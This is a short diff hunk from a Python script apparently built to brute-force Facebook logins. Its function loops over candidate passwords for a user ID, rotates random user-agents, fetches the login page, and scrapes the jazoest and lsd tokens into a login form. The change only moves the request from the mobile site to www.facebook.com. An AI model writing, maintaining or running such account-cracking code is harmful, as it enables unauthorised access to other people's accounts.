@@ -1763,7 +1763,7 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/login.php').text
+            free_fb = Session.get('https://www.facebook.com/login.php').text
             data = {'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 'email': uid,
